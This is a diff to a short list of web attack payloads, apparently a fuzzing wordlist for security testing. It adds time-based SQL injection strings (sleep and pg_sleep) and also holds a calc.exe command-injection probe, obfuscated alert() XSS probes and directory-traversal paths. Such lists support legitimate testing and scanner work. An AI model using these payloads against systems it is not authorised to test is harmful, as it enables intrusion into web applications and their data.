@@ -1,8 +1,9 @@
 t";calc.exe
+if(1=1,sleep(10),0)/*'XOR(if(1=1,sleep(10),0))OR'"XOR(if(1=1,sleep(10),0))OR"*/
+s'),pg_sleep(4);--
 window[['a'][0] + 'lert'](1337)
 window[[%27a%27][0]%252b%27lert%27](1337)
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
-if(1=1,sleep(10),0)/*'XOR(if(1=1,sleep(10),0))OR'"XOR(if(1=1,sleep(10),0))OR"*/
 t/../../../../t.txt
 /../../../../t1.txt
 t\..\..\..\..\t.txt
